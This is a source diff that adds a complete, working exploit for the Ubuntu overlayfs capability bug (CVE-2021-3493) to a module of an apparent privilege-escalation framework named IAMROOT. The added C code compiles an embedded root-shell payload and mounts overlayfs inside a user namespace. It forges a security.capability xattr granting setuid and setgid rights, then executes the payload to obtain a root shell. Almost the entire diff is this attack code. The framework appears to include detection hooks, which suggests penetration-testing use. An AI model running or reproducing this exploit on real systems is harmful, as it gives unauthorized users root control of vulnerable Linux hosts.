@@ -42,12 +42,14 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdbool.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <sched.h>
 #include <sys/mount.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
+#include <sys/xattr.h>
 #include <errno.h>
 
 static bool is_ubuntu(void)
@@ -193,17 +195,255 @@ static iamroot_result_t overlayfs_detect(const struct iamroot_ctx *ctx)
     return IAMROOT_OK;
 }
 
+/* ---- Exploit (vsh-style) ----------------------------------------
+ *
+ * The Ubuntu-overlayfs bug: file capabilities set inside a userns on
+ * a file in the overlayfs UPPER layer are recorded as a regular
+ * security.capability xattr on the host filesystem. Once outside the
+ * namespace, the host kernel honors that xattr for any process that
+ * execs the file — so we drop a payload with cap_setuid+ep in the
+ * upper layer, leave the namespace, and exec from outside.
+ *
+ * Layout:
+ *   workdir/
+ *     payload.c     — source for the payload binary
+ *     payload       — compiled binary (parent compiles)
+ *     lower/        — overlayfs lower (empty)
+ *     upper/        — overlayfs upper (where setcap'd file lives on host fs)
+ *     work/         — overlayfs workdir
+ *     merged/       — overlayfs merged view (child mounts here)
+ *
+ * Sequence:
+ *   1. Parent: mkdtemp workdir; compile payload.c → payload
+ *   2. Parent: fork → child
+ *      Child:  unshare(NEWUSER|NEWNS); write uid_map/gid_map (root in userns)
+ *      Child:  mount overlay merged/ with lower/upper/work
+ *      Child:  cp payload → merged/payload  (writes to upper/payload on host)
+ *      Child:  setcap cap_setuid,cap_setgid+ep on upper/payload via
+ *              setxattr("security.capability", ...) — the bug lets this
+ *              xattr stick on the host fs entry
+ *      Child:  exit
+ *   3. Parent: execve(upper/payload) — has cap_setuid effective → setuid(0)
+ *              → execve("/bin/sh") with uid=0
+ */
+
+static const char OVERLAYFS_PAYLOAD_SOURCE[] =
+    "#include <stdio.h>\n"
+    "#include <stdlib.h>\n"
+    "#include <unistd.h>\n"
+    "int main(void) {\n"
+    "    setuid(0); setgid(0);\n"
+    "    setresuid(0,0,0); setresgid(0,0,0);\n"
+    "    if (geteuid() != 0) { perror(\"setuid\"); return 1; }\n"
+    "    char *new_env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
+    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, new_env);\n"
+    "    execle(\"/bin/bash\", \"bash\", \"-p\", NULL, new_env);\n"
+    "    return 1;\n"
+    "}\n";
+
+/* libcap-less setcap: build the VFS_CAP_REVISION_2 binary blob and
+ * write it via setxattr("security.capability"). cap_setuid = bit 7,
+ * cap_setgid = bit 6. */
+static int overlayfs_set_cap_setuid(const char *path)
+{
+    /* struct vfs_cap_data (revision 2):
+     *   __le32 magic_etc           // revision in upper bits
+     *   __le32 permitted[2]        // 64-bit cap mask split low/high
+     *   __le32 inheritable[2]
+     */
+    unsigned char cap[20] = {0};
+    /* magic_etc: VFS_CAP_REVISION_2 = 0x02000000 (no flags) */
+    cap[0] = 0x00; cap[1] = 0x00; cap[2] = 0x00; cap[3] = 0x02;
+    /* permitted[0] = (1 << CAP_SETUID) | (1 << CAP_SETGID)
+     *              = (1 << 7) | (1 << 6) = 0xC0 */
+    cap[4] = 0xC0; cap[5] = 0x00; cap[6] = 0x00; cap[7] = 0x00;
+    /* effective bit (VFS_CAP_FLAGS_EFFECTIVE = 0x000001 OR'd into magic_etc) */
+    cap[0] |= 0x01;
+    return setxattr(path, "security.capability", cap, sizeof cap, 0);
+}
+
+static bool which_gcc(char *out_path, size_t outsz)
+{
+    static const char *candidates[] = {
+        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc",
+        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
+    };
+    for (size_t i = 0; candidates[i]; i++) {
+        if (access(candidates[i], X_OK) == 0) {
+            strncpy(out_path, candidates[i], outsz - 1);
+            out_path[outsz - 1] = 0;
+            return true;
+        }
+    }
+    return false;
+}
+
 static iamroot_result_t overlayfs_exploit(const struct iamroot_ctx *ctx)
 {
-    (void)ctx;
-    fprintf(stderr,
-        "[-] overlayfs: exploit not yet implemented in IAMROOT.\n"
-        "    Status: 🔵 DETECT-ONLY (see CVES.md).\n"
-        "    Reference: vsh's exploit-cve-2021-3493. The exploit mounts\n"
-        "    overlayfs inside a userns, places a /bin/sh-like binary in\n"
-        "    the upper layer with cap_setuid+ep set, then re-executes it\n"
-        "    outside the namespace to drop a root shell.\n");
-    return IAMROOT_PRECOND_FAIL;
+    /* Re-confirm vulnerable. */
+    iamroot_result_t pre = overlayfs_detect(ctx);
+    if (pre != IAMROOT_VULNERABLE) {
+        fprintf(stderr, "[-] overlayfs: detect() says not vulnerable; refusing\n");
+        return pre;
+    }
+    if (geteuid() == 0) {
+        fprintf(stderr, "[i] overlayfs: already root — nothing to escalate\n");
+        return IAMROOT_OK;
+    }
+
+    char workdir[] = "/tmp/iamroot-ovl-XXXXXX";
+    if (!mkdtemp(workdir)) { perror("mkdtemp"); return IAMROOT_TEST_ERROR; }
+    if (!ctx->json) fprintf(stderr, "[*] overlayfs: workdir = %s\n", workdir);
+
+    char gcc[256];
+    if (!which_gcc(gcc, sizeof gcc)) {
+        fprintf(stderr, "[-] overlayfs: no gcc/cc — exploit needs to compile a payload\n");
+        rmdir(workdir);
+        return IAMROOT_PRECOND_FAIL;
+    }
+
+    char src_path[1100], bin_path[1100];
+    snprintf(src_path, sizeof src_path, "%s/payload.c", workdir);
+    snprintf(bin_path, sizeof bin_path, "%s/payload", workdir);
+
+    int fd = open(src_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) { perror("open payload.c"); rmdir(workdir); return IAMROOT_TEST_ERROR; }
+    if (write(fd, OVERLAYFS_PAYLOAD_SOURCE, sizeof(OVERLAYFS_PAYLOAD_SOURCE) - 1)
+            != (ssize_t)(sizeof(OVERLAYFS_PAYLOAD_SOURCE) - 1)) {
+        close(fd); unlink(src_path); rmdir(workdir); return IAMROOT_TEST_ERROR;
+    }
+    close(fd);
+
+    /* Compile payload */
+    pid_t gc = fork();
+    if (gc == 0) {
+        execl(gcc, gcc, "-O2", "-static", "-o", bin_path, src_path, (char *)NULL);
+        _exit(127);
+    }
+    int gc_status;
+    waitpid(gc, &gc_status, 0);
+    if (!WIFEXITED(gc_status) || WEXITSTATUS(gc_status) != 0) {
+        /* try non-static fallback */
+        gc = fork();
+        if (gc == 0) {
+            execl(gcc, gcc, "-O2", "-o", bin_path, src_path, (char *)NULL);
+            _exit(127);
+        }
+        waitpid(gc, &gc_status, 0);
+        if (!WIFEXITED(gc_status) || WEXITSTATUS(gc_status) != 0) {
+            fprintf(stderr, "[-] overlayfs: gcc failed\n");
+            goto fail_workdir;
+        }
+    }
+    if (!ctx->json) fprintf(stderr, "[*] overlayfs: payload compiled\n");
+
+    /* mkdir lower / upper / work / merged */
+    char lower[1100], upper[1100], work[1100], merged[1100], upper_bin[2200];
+    snprintf(lower,  sizeof lower,  "%s/lower",  workdir);
+    snprintf(upper,  sizeof upper,  "%s/upper",  workdir);
+    snprintf(work,   sizeof work,   "%s/work",   workdir);
+    snprintf(merged, sizeof merged, "%s/merged", workdir);
+    snprintf(upper_bin, sizeof upper_bin, "%s/payload", upper);
+    if (mkdir(lower, 0755) < 0 || mkdir(upper, 0755) < 0
+        || mkdir(work, 0755) < 0 || mkdir(merged, 0755) < 0) {
+        perror("mkdir layout"); goto fail_workdir;
+    }
+
+    /* Fork child. Child enters userns + mountns and does the setcap. */
+    uid_t outer_uid = getuid();
+    gid_t outer_gid = getgid();
+    char uid_map[64], gid_map[64];
+    snprintf(uid_map, sizeof uid_map, "0 %u 1\n", outer_uid);
+    snprintf(gid_map, sizeof gid_map, "0 %u 1\n", outer_gid);
+
+    pid_t child = fork();
+    if (child < 0) { perror("fork"); goto fail_workdir; }
+    if (child == 0) {
+        /* CHILD: enter userns + mountns, do the exploit setup */
+        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
+        /* Wait for parent to set our uid_map/gid_map */
+        /* Actually we'll do it ourselves now since we already unshared */
+        char self_uid_map[64], self_gid_map[64];
+        snprintf(self_uid_map, sizeof self_uid_map, "/proc/self/uid_map");
+        snprintf(self_gid_map, sizeof self_gid_map, "/proc/self/gid_map");
+        int f = open("/proc/self/setgroups", O_WRONLY);
+        if (f >= 0) { (void)!write(f, "deny\n", 5); close(f); }
+        f = open(self_uid_map, O_WRONLY);
+        if (f < 0 || write(f, uid_map, strlen(uid_map)) < 0) {
+            perror("write uid_map"); _exit(3);
+        }
+        close(f);
+        f = open(self_gid_map, O_WRONLY);
+        if (f < 0 || write(f, gid_map, strlen(gid_map)) < 0) {
+            perror("write gid_map"); _exit(4);
+        }
+        close(f);
+
+        /* Now uid 0 inside userns. Mount overlayfs. */
+        char opts[4096];
+        snprintf(opts, sizeof opts, "lowerdir=%s,upperdir=%s,workdir=%s",
+                 lower, upper, work);
+        if (mount("overlay", merged, "overlay", 0, opts) < 0) {
+            perror("mount overlay"); _exit(5);
+        }
+
+        /* Copy payload into merged dir (writes to upper on host fs) */
+        char merged_bin[2200];
+        snprintf(merged_bin, sizeof merged_bin, "%s/payload", merged);
+        int in = open(bin_path, O_RDONLY);
+        int out = open(merged_bin, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (in < 0 || out < 0) { perror("open copy"); _exit(6); }
+        char copybuf[4096];
+        ssize_t n;
+        while ((n = read(in, copybuf, sizeof copybuf)) > 0) {
+            if (write(out, copybuf, n) != n) { perror("write copy"); _exit(7); }
+        }
+        close(in); close(out);
+
+        /* setcap cap_setuid,cap_setgid+ep on the merged copy.
+         * THE BUG: this xattr persists on the host's upper/ file. */
+        if (overlayfs_set_cap_setuid(merged_bin) < 0) {
+            perror("setxattr security.capability"); _exit(8);
+        }
+        _exit(0);
+    }
+    int cstatus;
+    waitpid(child, &cstatus, 0);
+    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
+        fprintf(stderr, "[-] overlayfs: child setup failed (status=%d)\n", cstatus);
+        goto fail_workdir;
+    }
+
+    /* Verify the xattr stuck on the host fs entry */
+    char check_xattr[20];
+    ssize_t got = getxattr(upper_bin, "security.capability", check_xattr,
+                           sizeof check_xattr);
+    if (got <= 0) {
+        fprintf(stderr, "[-] overlayfs: xattr did not persist on host upper "
+                        "(getxattr returned %zd; errno=%d). Patched or AppArmor-blocked.\n",
+                got, errno);
+        goto fail_workdir;
+    }
+
+    if (!ctx->json) {
+        fprintf(stderr, "[+] overlayfs: cap_setuid+ep xattr persisted on host fs "
+                        "— execing payload to drop root\n");
+    }
+    if (ctx->no_shell) {
+        fprintf(stderr, "[+] overlayfs: --no-shell — payload at %s, not exec'ing\n",
+                upper_bin);
+        return IAMROOT_EXPLOIT_OK;
+    }
+    fflush(NULL);
+    execl(upper_bin, upper_bin, (char *)NULL);
+    perror("execl payload");
+
+fail_workdir:
+    /* best-effort cleanup */
+    unlink(src_path); unlink(bin_path); unlink(upper_bin);
+    rmdir(merged); rmdir(work); rmdir(upper); rmdir(lower);
+    rmdir(workdir);
+    return IAMROOT_EXPLOIT_FAIL;
 }
 
 /* ----- Embedded detection rules ----- */
@@ -225,7 +465,8 @@ const struct iamroot_module overlayfs_module = {
     .detect         = overlayfs_detect,
     .exploit        = overlayfs_exploit,
     .mitigate       = NULL,
-    .cleanup        = NULL,
+    .cleanup        = NULL,    /* exploit cleans up its own workdir on failure;
+                                * on success, exec replaces us so cleanup-by-us doesn't apply */
     .detect_auditd  = overlayfs_auditd,
     .detect_sigma   = NULL,
     .detect_yara    = NULL,
